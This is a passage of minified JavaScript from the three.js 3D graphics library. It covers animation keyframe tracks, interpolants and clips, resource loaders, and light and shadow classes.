_classCallCheck2(this,n),(o=t.call(this,e,r,i,a))._weightPrev=-0,o._offsetPrev=-0,o._weightNext=-0,o._offsetNext=-0,o.DefaultSettings_={endingStart:2400,endingEnd:2400},o}return _createClass2(n,[{key:"intervalChanged_",value:function(e,t,n){var r=this.parameterPositions,i=e-2,a=e+1,o=r[i],s=r[a];if(void 0===o)switch(this.getSettings_().endingStart){case 2401:i=e,o=2*t-n;break;case 2402:o=t+r[i=r.length-2]-r[i+1];break;default:i=e,o=n}if(void 0===s)switch(this.getSettings_().endingEnd){case 2401:a=e,s=2*n-t;break;case 2402:s=n+r[a=1]-r[0];break;default:a=e-1,s=t}var l=.5*(n-t),c=this.valueSize;this._weightPrev=l/(t-o),this._weightNext=l/(s-n),this._offsetPrev=i*c,this._offsetNext=a*c}},{key:"interpolate_",value:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=e*o,l=s-o,c=this._offsetPrev,u=this._offsetNext,d=this._weightPrev,p=this._weightNext,h=(n-t)/(r-t),f=h*h,A=f*h,m=-d*A+2*d*f-d*h,v=(1+d)*A+(-1.5-2*d)*f+(-.5+d)*h+1,g=(-1-p)*A+(1.5+p)*f+.5*h,y=p*A-p*f,b=0;b!==o;++b)i[b]=m*a[c+b]+v*a[l+b]+g*a[s+b]+y*a[u+b];return i}}]),n}(),Sl=function(e){_inherits2(n,Cl);var t=_createSuper(n);function n(e,r,i,a){return _classCallCheck2(this,n),t.call(this,e,r,i,a)}return _createClass2(n,[{key:"interpolate_",value:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=e*o,l=s-o,c=(n-t)/(r-t),u=1-c,d=0;d!==o;++d)i[d]=a[l+d]*u+a[s+d]*c;return i}}]),n}(),kl=function(e){_inherits2(n,Cl);var t=_createSuper(n);function n(e,r,i,a){return _classCallCheck2(this,n),t.call(this,e,r,i,a)}return _createClass2(n,[{key:"interpolate_",value:function(e){return this.copySampleValue_(e-1)}}]),n}(),Ml=function(){function e(t,n,r,i){if(_classCallCheck2(this,e),void 0===t)throw new Error("THREE.KeyframeTrack: track name is undefined");if(void 0===n||0===n.length)throw new Error("THREE.KeyframeTrack: no keyframes in track named "+t);this.name=t,this.times=wl.convertArray(n,this.TimeBufferType),this.values=wl.convertArray(r,this.ValueBufferType),this.setInterpolation(i||this.DefaultInterpolation)}return _createClass2(e,[{key:"InterpolantFactoryMethodDiscrete",value:function(e){return new kl(this.times,this.values,this.getValueSize(),e)}},{key:"InterpolantFactoryMethodLinear",value:function(e){return new Sl(this.times,this.values,this.getValueSize(),e)}},{key:"InterpolantFactoryMethodSmooth",value:function(e){return new xl(this.times,this.values,this.getValueSize(),e)}},{key:"setInterpolation",value:function(e){var t;switch(e){case 2300:t=this.InterpolantFactoryMethodDiscrete;break;case 2301:t=this.InterpolantFactoryMethodLinear;break;case 2302:t=this.InterpolantFactoryMethodSmooth}if(void 0!==t)return this.createInterpolant=t,this;var n="unsupported interpolation for "+this.ValueTypeName+" keyframe track named "+this.name;if(void 0===this.createInterpolant){if(e===this.DefaultInterpolation)throw new Error(n);this.setInterpolation(this.DefaultInterpolation)}return this}},{key:"getInterpolation",value:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}}},{key:"getValueSize",value:function(){return this.values.length/this.times.length}},{key:"shift",value:function(e){if(0!==e)for(var t=this.times,n=0,r=t.length;n!==r;++n)t[n]+=e;return this}},{key:"scale",value:function(e){if(1!==e)for(var t=this.times,n=0,r=t.length;n!==r;++n)t[n]*=e;return this}},{key:"trim",value:function(e,t){for(var n=this.times,r=n.length,i=0,a=r-1;i!==r&&n[i]<e;)++i;for(;-1!==a&&n[a]>t;)--a;if(++a,0!==i||a!==r){a<=i&&(i=(a=Math.max(a,1))-1);var o=this.getValueSize();this.times=wl.arraySlice(n,i,a),this.values=wl.arraySlice(this.values,i*o,a*o)}return this}},{key:"validate",value:function(){var e=!0,t=this.getValueSize();t-Math.floor(t)!=0&&(e=!1);var n=this.times,r=this.values,i=n.length;0===i&&(e=!1);for(var a=null,o=0;o!==i;o++){var s=n[o];if("number"==typeof s&&isNaN(s)){e=!1;break}if(null!==a&&s<a){e=!1;break}a=s}if(void 0!==r&&wl.isTypedArray(r))for(var l=0,c=r.length;l!==c;++l){var u=r[l];if(isNaN(u)){e=!1;break}}return e}},{key:"optimize",value:function(){for(var e=wl.arraySlice(this.times),t=wl.arraySlice(this.values),n=this.getValueSize(),r=2302===this.getInterpolation(),i=e.length-1,a=1,o=1;o<i;++o){var s=!1,l=e[o];if(l!==e[o+1]&&(1!==o||l!==e[0]))if(r)s=!0;else for(var c=o*n,u=c-n,d=c+n,p=0;p!==n;++p){var h=t[c+p];if(h!==t[u+p]||h!==t[d+p]){s=!0;break}}if(s){if(o!==a){e[a]=e[o];for(var f=o*n,A=a*n,m=0;m!==n;++m)t[A+m]=t[f+m]}++a}}if(0<i){e[a]=e[i];for(var v=i*n,g=a*n,y=0;y!==n;++y)t[g+y]=t[v+y];++a}return a!==e.length?(this.times=wl.arraySlice(e,0,a),this.values=wl.arraySlice(t,0,a*n)):(this.times=e,this.values=t),this}},{key:"clone",value:function(){var e=wl.arraySlice(this.times,0),t=wl.arraySlice(this.values,0),n=new this.constructor(this.name,e,t);return n.createInterpolant=this.createInterpolant,n}}],[{key:"toJSON",value:function(e){var t,n=e.constructor;if(n.toJSON!==this.toJSON)t=n.toJSON(e);else{t={name:e.name,times:wl.convertArray(e.times,Array),values:wl.convertArray(e.values,Array)};var r=e.getInterpolation();r!==e.DefaultInterpolation&&(t.interpolation=r)}return t.type=e.ValueTypeName,t}}]),e}();Ml.prototype.TimeBufferType=Float32Array,Ml.prototype.ValueBufferType=Float32Array,Ml.prototype.DefaultInterpolation=2301;var Bl=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();Bl.prototype.ValueTypeName="bool",Bl.prototype.ValueBufferType=Array,Bl.prototype.DefaultInterpolation=2300,Bl.prototype.InterpolantFactoryMethodLinear=void 0,Bl.prototype.InterpolantFactoryMethodSmooth=void 0;var El=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();El.prototype.ValueTypeName="color";var Tl=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();Tl.prototype.ValueTypeName="number";var Pl=function(e){_inherits2(n,Cl);var t=_createSuper(n);function n(e,r,i,a){return _classCallCheck2(this,n),t.call(this,e,r,i,a)}return _createClass2(n,[{key:"interpolate_",value:function(e,t,n,r){for(var i=this.resultBuffer,a=this.sampleValues,o=this.valueSize,s=(n-t)/(r-t),l=e*o,c=l+o;l!==c;l+=4)ge.slerpFlat(i,0,a,l-o,a,l,s);return i}}]),n}(),Il=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return _createClass2(n,[{key:"InterpolantFactoryMethodLinear",value:function(e){return new Pl(this.times,this.values,this.getValueSize(),e)}}]),n}();Il.prototype.ValueTypeName="quaternion",Il.prototype.DefaultInterpolation=2301,Il.prototype.InterpolantFactoryMethodSmooth=void 0;var Fl=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();Fl.prototype.ValueTypeName="string",Fl.prototype.ValueBufferType=Array,Fl.prototype.DefaultInterpolation=2300,Fl.prototype.InterpolantFactoryMethodLinear=void 0,Fl.prototype.InterpolantFactoryMethodSmooth=void 0;var Ll=function(e){_inherits2(n,Ml);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.apply(this,arguments)}return n}();Ll.prototype.ValueTypeName="vector";var Ol=function(){function e(t){var n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:-1,r=2<arguments.length?arguments[2]:void 0,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:2500;_classCallCheck2(this,e),this.name=t,this.tracks=r,this.duration=n,this.blendMode=i,this.uuid=q(),this.duration<0&&this.resetDuration()}return _createClass2(e,[{key:"resetDuration",value:function(){for(var e=0,t=0,n=this.tracks.length;t!==n;++t){var r=this.tracks[t];e=Math.max(e,r.times[r.times.length-1])}return this.duration=e,this}},{key:"trim",value:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].trim(0,this.duration);return this}},{key:"validate",value:function(){for(var e=!0,t=0;t<this.tracks.length;t++)e=e&&this.tracks[t].validate();return e}},{key:"optimize",value:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].optimize();return this}},{key:"clone",value:function(){for(var e=[],t=0;t<this.tracks.length;t++)e.push(this.tracks[t].clone());return new this.constructor(this.name,this.duration,e,this.blendMode)}},{key:"toJSON",value:function(){return this.constructor.toJSON(this)}}],[{key:"parse",value:function(e){for(var t=[],n=e.tracks,r=1/(e.fps||1),i=0,a=n.length;i!==a;++i)t.push(Nl(n[i]).scale(r));var o=new this(e.name,e.duration,t,e.blendMode);return o.uuid=e.uuid,o}},{key:"toJSON",value:function(e){for(var t=[],n=e.tracks,r={name:e.name,duration:e.duration,tracks:t,uuid:e.uuid,blendMode:e.blendMode},i=0,a=n.length;i!==a;++i)t.push(Ml.toJSON(n[i]));return r}},{key:"CreateFromMorphTargetSequence",value:function(e,t,n,r){for(var i=t.length,a=[],o=0;o<i;o++){var s=[],l=[];s.push((o+i-1)%i,o,(o+1)%i),l.push(0,1,0);var c=wl.getKeyframeOrder(s);s=wl.sortedArray(s,1,c),l=wl.sortedArray(l,1,c),r||0!==s[0]||(s.push(i),l.push(l[0])),a.push(new Tl(".morphTargetInfluences["+t[o].name+"]",s,l).scale(1/n))}return new this(e,-1,a)}},{key:"findByName",value:function(e,t){var n=e;if(!Array.isArray(e)){var r=e;n=r.geometry&&r.geometry.animations||r.animations}for(var i=0;i<n.length;i++)if(n[i].name===t)return n[i];return null}},{key:"CreateClipsFromMorphTargetSequences",value:function(e,t,n){for(var r={},i=/^([\w-]*?)([\d]+)$/,a=0,o=e.length;a<o;a++){var s=e[a],l=s.name.match(i);if(l&&1<l.length){var c=l[1],u=r[c];u||(r[c]=u=[]),u.push(s)}}var d=[];for(var p in r)d.push(this.CreateFromMorphTargetSequence(p,r[p],t,n));return d}},{key:"parseAnimation",value:function(e,t){if(!e)return null;for(var n=function(e,t,n,r,i){if(0!==n.length){var a=[],o=[];wl.flattenJSON(n,a,o,r),0!==a.length&&i.push(new e(t,a,o))}},r=[],i=e.name||"default",a=e.fps||30,o=e.blendMode,s=e.length||-1,l=e.hierarchy||[],c=0;c<l.length;c++){var u=l[c].keys;if(u&&0!==u.length)if(u[0].morphTargets){var d={},p=void 0;for(p=0;p<u.length;p++)if(u[p].morphTargets)for(var h=0;h<u[p].morphTargets.length;h++)d[u[p].morphTargets[h]]=-1;for(var f in d){for(var A=[],m=[],v=0;v!==u[p].morphTargets.length;++v){var g=u[p];A.push(g.time),m.push(g.morphTarget===f?1:0)}r.push(new Tl(".morphTargetInfluence["+f+"]",A,m))}s=d.length*(a||1)}else{var y=".bones["+t[c].name+"]";n(Ll,y+".position",u,"pos",r),n(Il,y+".quaternion",u,"rot",r),n(Ll,y+".scale",u,"scl",r)}}return 0===r.length?null:new this(i,s,r,o)}}]),e}();function Nl(e){if(void 0===e.type)throw new Error("THREE.KeyframeTrack: track type undefined, can not parse");var t=function(e){switch(e.toLowerCase()){case"scalar":case"double":case"float":case"number":case"integer":return Tl;case"vector":case"vector2":case"vector3":case"vector4":return Ll;case"color":return El;case"quaternion":return Il;case"bool":case"boolean":return Bl;case"string":return Fl}throw new Error("THREE.KeyframeTrack: Unsupported typeName: "+e)}(e.type);if(void 0===e.times){var n=[],r=[];wl.flattenJSON(e.keys,n,r,"value"),e.times=n,e.values=r}return void 0!==t.parse?t.parse(e):new t(e.name,e.times,e.values,e.interpolation)}var Dl={enabled:!1,files:{},add:function(e,t){!1!==this.enabled&&(this.files[e]=t)},get:function(e){if(!1!==this.enabled)return this.files[e]},remove:function(e){delete this.files[e]},clear:function(){this.files={}}},Rl=function e(t,n,r){_classCallCheck2(this,e);var i=this,a=!1,o=0,s=0,l=void 0,c=[];this.onStart=void 0,this.onLoad=t,this.onProgress=n,this.onError=r,this.itemStart=function(e){s++,!1===a&&void 0!==i.onStart&&i.onStart(e,o,s),a=!0},this.itemEnd=function(e){o++,void 0!==i.onProgress&&i.onProgress(e,o,s),o===s&&(a=!1,void 0!==i.onLoad&&i.onLoad())},this.itemError=function(e){void 0!==i.onError&&i.onError(e)},this.resolveURL=function(e){return l?l(e):e},this.setURLModifier=function(e){return l=e,this},this.addHandler=function(e,t){return c.push(e,t),this},this.removeHandler=function(e){var t=c.indexOf(e);return-1!==t&&c.splice(t,2),this},this.getHandler=function(e){for(var t=0,n=c.length;t<n;t+=2){var r=c[t],i=c[t+1];if(r.global&&(r.lastIndex=0),r.test(e))return i}return null}},jl=new Rl,Ul=function(){function e(t){_classCallCheck2(this,e),this.manager=void 0!==t?t:jl,this.crossOrigin="anonymous",this.withCredentials=!1,this.path="",this.resourcePath="",this.requestHeader={}}return _createClass2(e,[{key:"load",value:function(){}},{key:"loadAsync",value:function(e,t){var n=this;return new Promise((function(r,i){n.load(e,r,t,i)}))}},{key:"parse",value:function(){}},{key:"setCrossOrigin",value:function(e){return this.crossOrigin=e,this}},{key:"setWithCredentials",value:function(e){return this.withCredentials=e,this}},{key:"setPath",value:function(e){return this.path=e,this}},{key:"setResourcePath",value:function(e){return this.resourcePath=e,this}},{key:"setRequestHeader",value:function(e){return this.requestHeader=e,this}}]),e}(),$l={},zl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this;void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var a=Dl.get(e);if(void 0!==a)return this.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;if(void 0===$l[e]){$l[e]=[],$l[e].push({onLoad:t,onProgress:n,onError:r});var o=new Request(e,{headers:new Headers(this.requestHeader),credentials:this.withCredentials?"include":"same-origin"});fetch(o).then((function(t){if(200!==t.status&&0!==t.status)throw Error('fetch for "'.concat(t.url,'" responded with ').concat(t.status,": ").concat(t.statusText));if(t.status,"undefined"==typeof ReadableStream||void 0===t.body.getReader)return t;var n=$l[e],r=t.body.getReader(),i=t.headers.get("Content-Length"),a=i?parseInt(i):0,o=0!==a,s=0,l=new ReadableStream({start:function(e){!function t(){r.read().then((function(r){var i=r.done,l=r.value;if(i)e.close();else{s+=l.byteLength;for(var c=new ProgressEvent("progress",{lengthComputable:o,loaded:s,total:a}),u=0,d=n.length;u<d;u++){var p=n[u];p.onProgress&&p.onProgress(c)}e.enqueue(l),t()}}))}()}});return new Response(l)})).then((function(e){switch(i.responseType){case"arraybuffer":return e.arrayBuffer();case"blob":return e.blob();case"document":return e.text().then((function(e){return(new DOMParser).parseFromString(e,i.mimeType)}));case"json":return e.json();default:return e.text()}})).then((function(t){Dl.add(e,t);var n=$l[e];delete $l[e];for(var r=0,i=n.length;r<i;r++){var a=n[r];a.onLoad&&a.onLoad(t)}})).catch((function(t){var n=$l[e];if(void 0===n)throw i.manager.itemError(e),t;delete $l[e];for(var r=0,a=n.length;r<a;r++){var o=n[r];o.onError&&o.onError(t)}i.manager.itemError(e)})).finally((function(){i.manager.itemEnd(e)})),this.manager.itemStart(e)}else $l[e].push({onLoad:t,onProgress:n,onError:r})}},{key:"setResponseType",value:function(e){return this.responseType=e,this}},{key:"setMimeType",value:function(e){return this.mimeType=e,this}}]),n}(),Hl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=new zl(this.manager);a.setPath(this.path),a.setRequestHeader(this.requestHeader),a.setWithCredentials(this.withCredentials),a.load(e,(function(n){try{t(i.parse(JSON.parse(n)))}catch(n){r&&r(n),i.manager.itemError(e)}}),n,r)}},{key:"parse",value:function(e){for(var t=[],n=0;n<e.length;n++){var r=Ol.parse(e[n]);t.push(r)}return t}}]),n}(),Vl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=[],o=new Qo,s=new zl(this.manager);s.setPath(this.path),s.setResponseType("arraybuffer"),s.setRequestHeader(this.requestHeader),s.setWithCredentials(i.withCredentials);var l=0;function c(c){s.load(e[c],(function(e){var n=i.parse(e,!0);a[c]={width:n.width,height:n.height,format:n.format,mipmaps:n.mipmaps},6===(l+=1)&&(1===n.mipmapCount&&(o.minFilter=A),o.image=a,o.format=n.format,o.needsUpdate=!0,t&&t(o))}),n,r)}if(Array.isArray(e))for(var u=0,d=e.length;u<d;++u)c(u);else s.load(e,(function(e){var n=i.parse(e,!0);if(n.isCubemap){for(var r=n.mipmaps.length/n.mipmapCount,s=0;s<r;s++){a[s]={mipmaps:[]};for(var l=0;l<n.mipmapCount;l++)a[s].mipmaps.push(n.mipmaps[s*n.mipmapCount+l]),a[s].format=n.format,a[s].width=n.width,a[s].height=n.height}o.image=a}else o.image.width=n.width,o.image.height=n.height,o.mipmaps=n.mipmaps;1===n.mipmapCount&&(o.minFilter=A),o.format=n.format,o.needsUpdate=!0,t&&t(o)}),n,r);return o}}]),n}(),Ql=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var i=this,a=Dl.get(e);if(void 0!==a)return i.manager.itemStart(e),setTimeout((function(){t&&t(a),i.manager.itemEnd(e)}),0),a;var o=ce("img");function s(){c(),Dl.add(e,this),t&&t(this),i.manager.itemEnd(e)}function l(t){c(),r&&r(t),i.manager.itemError(e),i.manager.itemEnd(e)}function c(){o.removeEventListener("load",s,!1),o.removeEventListener("error",l,!1)}return o.addEventListener("load",s,!1),o.addEventListener("error",l,!1),"data:"!==e.substr(0,5)&&void 0!==this.crossOrigin&&(o.crossOrigin=this.crossOrigin),i.manager.itemStart(e),o.src=e,o}}]),n}(),Gl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=new Rn,a=new Ql(this.manager);a.setCrossOrigin(this.crossOrigin),a.setPath(this.path);var o=0;function s(n){a.load(e[n],(function(e){i.images[n]=e,6==++o&&(i.needsUpdate=!0,t&&t(i))}),void 0,r)}for(var l=0;l<e.length;++l)s(l);return i}}]),n}(),Wl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=this,a=new Ao,o=new zl(this.manager);return o.setResponseType("arraybuffer"),o.setRequestHeader(this.requestHeader),o.setPath(this.path),o.setWithCredentials(i.withCredentials),o.load(e,(function(e){var n=i.parse(e);n&&(void 0!==n.image?a.image=n.image:void 0!==n.data&&(a.image.width=n.width,a.image.height=n.height,a.image.data=n.data),a.wrapS=void 0!==n.wrapS?n.wrapS:u,a.wrapT=void 0!==n.wrapT?n.wrapT:u,a.magFilter=void 0!==n.magFilter?n.magFilter:A,a.minFilter=void 0!==n.minFilter?n.minFilter:A,a.anisotropy=void 0!==n.anisotropy?n.anisotropy:1,void 0!==n.encoding&&(a.encoding=n.encoding),void 0!==n.flipY&&(a.flipY=n.flipY),void 0!==n.format&&(a.format=n.format),void 0!==n.type&&(a.type=n.type),void 0!==n.mipmaps&&(a.mipmaps=n.mipmaps,a.minFilter=v),1===n.mipmapCount&&(a.minFilter=A),void 0!==n.generateMipmaps&&(a.generateMipmaps=n.generateMipmaps),a.needsUpdate=!0,t&&t(a,n))}),n,r),a}}]),n}(),Kl=function(e){_inherits2(n,Ul);var t=_createSuper(n);function n(e){return _classCallCheck2(this,n),t.call(this,e)}return _createClass2(n,[{key:"load",value:function(e,t,n,r){var i=new pe,a=new Ql(this.manager);return a.setCrossOrigin(this.crossOrigin),a.setPath(this.path),a.load(e,(function(e){i.image=e,i.needsUpdate=!0,void 0!==t&&t(i)}),n,r),i}}]),n}(),ql=function(e){_inherits2(n,_t);var t=_createSuper(n);function n(e){var r,i=1<arguments.length&&void 0!==arguments[1]?arguments[1]:1;return _classCallCheck2(this,n),(r=t.call(this)).type="Light",r.color=new $t(e),r.intensity=i,r}return _createClass2(n,[{key:"dispose",value:function(){}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.color.copy(e.color),this.intensity=e.intensity,this}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.object.color=this.color.getHex(),t.object.intensity=this.intensity,void 0!==this.groundColor&&(t.object.groundColor=this.groundColor.getHex()),void 0!==this.distance&&(t.object.distance=this.distance),void 0!==this.angle&&(t.object.angle=this.angle),void 0!==this.decay&&(t.object.decay=this.decay),void 0!==this.penumbra&&(t.object.penumbra=this.penumbra),void 0!==this.shadow&&(t.object.shadow=this.shadow.toJSON()),t}}]),n}();ql.prototype.isLight=!0;var Xl=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r,i){var a;return _classCallCheck2(this,n),(a=t.call(this,e,i)).type="HemisphereLight",a.position.copy(_t.DefaultUp),a.updateMatrix(),a.groundColor=new $t(r),a}return _createClass2(n,[{key:"copy",value:function(e){return ql.prototype.copy.call(this,e),this.groundColor.copy(e.groundColor),this}}]),n}();Xl.prototype.isHemisphereLight=!0;var Yl=new Xe,Jl=new ye,Zl=new ye,ec=function(){function e(t){_classCallCheck2(this,e),this.camera=t,this.bias=0,this.normalBias=0,this.radius=1,this.blurSamples=8,this.mapSize=new re(512,512),this.map=null,this.mapPass=null,this.matrix=new Xe,this.autoUpdate=!0,this.needsUpdate=!1,this._frustum=new Gn,this._frameExtents=new re(1,1),this._viewportCount=1,this._viewports=[new fe(0,0,1,1)]}return _createClass2(e,[{key:"getViewportCount",value:function(){return this._viewportCount}},{key:"getFrustum",value:function(){return this._frustum}},{key:"updateMatrices",value:function(e){var t=this.camera,n=this.matrix;Jl.setFromMatrixPosition(e.matrixWorld),t.position.copy(Jl),Zl.setFromMatrixPosition(e.target.matrixWorld),t.lookAt(Zl),t.updateMatrixWorld(),Yl.multiplyMatrices(t.projectionMatrix,t.matrixWorldInverse),this._frustum.setFromProjectionMatrix(Yl),n.set(.5,0,0,.5,0,.5,0,.5,0,0,.5,.5,0,0,0,1),n.multiply(t.projectionMatrix),n.multiply(t.matrixWorldInverse)}},{key:"getViewport",value:function(e){return this._viewports[e]}},{key:"getFrameExtents",value:function(){return this._frameExtents}},{key:"dispose",value:function(){this.map&&this.map.dispose(),this.mapPass&&this.mapPass.dispose()}},{key:"copy",value:function(e){return this.camera=e.camera.clone(),this.bias=e.bias,this.radius=e.radius,this.mapSize.copy(e.mapSize),this}},{key:"clone",value:function(){return(new this.constructor).copy(this)}},{key:"toJSON",value:function(){var e={};return 0!==this.bias&&(e.bias=this.bias),0!==this.normalBias&&(e.normalBias=this.normalBias),1!==this.radius&&(e.radius=this.radius),512===this.mapSize.x&&512===this.mapSize.y||(e.mapSize=this.mapSize.toArray()),e.camera=this.camera.toJSON(!1).object,delete e.camera.matrix,e}}]),e}(),tc=function(e){_inherits2(n,ec);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this,new Nn(50,1,.5,500))).focus=1,e}return _createClass2(n,[{key:"updateMatrices",value:function(e){var t=this.camera,r=2*K*e.angle*this.focus,i=this.mapSize.width/this.mapSize.height,a=e.distance||t.far;r===t.fov&&i===t.aspect&&a===t.far||(t.fov=r,t.aspect=i,t.far=a,t.updateProjectionMatrix()),_get2(_getPrototypeOf(n.prototype),"updateMatrices",this).call(this,e)}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.focus=e.focus,this}}]),n}();tc.prototype.isSpotLightShadow=!0;var nc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:Math.PI/3,s=4<arguments.length&&void 0!==arguments[4]?arguments[4]:0,l=5<arguments.length&&void 0!==arguments[5]?arguments[5]:1;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="SpotLight",i.position.copy(_t.DefaultUp),i.updateMatrix(),i.target=new _t,i.distance=a,i.angle=o,i.penumbra=s,i.decay=l,i.shadow=new tc,i}return _createClass2(n,[{key:"dispose",value:function(){this.shadow.dispose()}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.distance=e.distance,this.angle=e.angle,this.penumbra=e.penumbra,this.decay=e.decay,this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}},{key:"power",get:function(){return this.intensity*Math.PI},set:function(e){this.intensity=e/Math.PI}}]),n}();nc.prototype.isSpotLight=!0;var rc=new Xe,ic=new ye,ac=new ye,oc=function(e){_inherits2(n,ec);var t=_createSuper(n);function n(){var e;return _classCallCheck2(this,n),(e=t.call(this,new Nn(90,1,.5,500)))._frameExtents=new re(4,2),e._viewportCount=6,e._viewports=[new fe(2,1,1,1),new fe(0,1,1,1),new fe(3,1,1,1),new fe(1,1,1,1),new fe(3,0,1,1),new fe(1,0,1,1)],e._cubeDirections=[new ye(1,0,0),new ye(-1,0,0),new ye(0,0,1),new ye(0,0,-1),new ye(0,1,0),new ye(0,-1,0)],e._cubeUps=[new ye(0,1,0),new ye(0,1,0),new ye(0,1,0),new ye(0,1,0),new ye(0,0,1),new ye(0,0,-1)],e}return _createClass2(n,[{key:"updateMatrices",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=this.camera,r=this.matrix,i=e.distance||n.far;i!==n.far&&(n.far=i,n.updateProjectionMatrix()),ic.setFromMatrixPosition(e.matrixWorld),n.position.copy(ic),ac.copy(n.position),ac.add(this._cubeDirections[t]),n.up.copy(this._cubeUps[t]),n.lookAt(ac),n.updateMatrixWorld(),r.makeTranslation(-ic.x,-ic.y,-ic.z),rc.multiplyMatrices(n.projectionMatrix,n.matrixWorldInverse),this._frustum.setFromProjectionMatrix(rc)}}]),n}();oc.prototype.isPointLightShadow=!0;var sc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:1;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="PointLight",i.distance=a,i.decay=o,i.shadow=new oc,i}return _createClass2(n,[{key:"dispose",value:function(){this.shadow.dispose()}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.distance=e.distance,this.decay=e.decay,this.shadow=e.shadow.clone(),this}},{key:"power",get:function(){return 4*this.intensity*Math.PI},set:function(e){this.intensity=e/(4*Math.PI)}}]),n}();sc.prototype.isPointLight=!0;var lc=function(e){_inherits2(n,ec);var t=_createSuper(n);function n(){return _classCallCheck2(this,n),t.call(this,new ar(-5,5,5,-5,.5,500))}return n}();lc.prototype.isDirectionalLightShadow=!0;var cc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r){var i;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="DirectionalLight",i.position.copy(_t.DefaultUp),i.updateMatrix(),i.target=new _t,i.shadow=new lc,i}return _createClass2(n,[{key:"dispose",value:function(){this.shadow.dispose()}},{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.target=e.target.clone(),this.shadow=e.shadow.clone(),this}}]),n}();cc.prototype.isDirectionalLight=!0;var uc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r){var i;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="AmbientLight",i}return n}();uc.prototype.isAmbientLight=!0;var dc=function(e){_inherits2(n,ql);var t=_createSuper(n);function n(e,r){var i,a=2<arguments.length&&void 0!==arguments[2]?arguments[2]:10,o=3<arguments.length&&void 0!==arguments[3]?arguments[3]:10;return _classCallCheck2(this,n),(i=t.call(this,e,r)).type="RectAreaLight",i.width=a,i.height=o,i}return _createClass2(n,[{key:"copy",value:function(e){return _get2(_getPrototypeOf(n.prototype),"copy",this).call(this,e),this.width=e.width,this.height=e.height,this}},{key:"toJSON",value:function(e){var t=_get2(_getPrototypeOf(n.prototype),"toJSON",this).call(this,e);return t.object.width=this.width,t.object.height=this.height,t}},{key:"power",get:function(){return this.intensity*this.width*this.height*Math.PI},set:function(e){this.intensity=e/(this.width*this.height*Math.PI)}}]),n}();dc.prototype.isRectAreaLight=!0;var pc=function(){function e(){_classCallCheck2(this,e),this.coefficients=[];for(var t=0;t<9;t++)this.coefficients.push(new ye)}return _createClass2(e,[{key:"set",value:function(e){for(var t=0;t<9;t++)this.coefficients[t].copy(e[t]);return this}},{key:"zero",value:function(){for(var e=0;e<9;e++)this.coefficients[e].set(0,0,0);return this}},{key:"getAt",value:function(e,t){var n=e.x,r=e.y,i=e.z,a=this.coefficients;return 